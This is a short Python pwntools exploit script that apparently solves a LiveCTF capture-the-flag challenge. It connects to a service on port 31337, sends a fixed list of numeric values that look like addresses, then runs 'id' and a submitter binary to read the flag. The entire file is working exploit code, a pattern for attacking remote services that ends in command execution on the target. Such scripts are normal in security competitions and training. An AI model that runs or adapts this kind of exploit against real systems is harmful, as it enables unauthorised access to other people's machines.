#!/usr/bin/env python3

from pwn import *

HOST = os.environ.get('HOST', 'localhost')
PORT = 31337
p = remote(HOST, int(PORT))
def E(x):
    if type(x) is str:
        return x.encode()
    return x
sla = lambda a,b: p.sendlineafter(E(a),E(b))

todo = [1,1,1,400000000,402218,250270,1,471885,402218,250289,1,471885,401914,0]

for i in todo:
    sla('pls:',str(i))

p.sendline(b"id")

p.sendline(b'./submitter')
flag = p.recvline_contains(b'LiveCTF{').decode().strip()
log.info('Flag: %s', flag)
p.close()

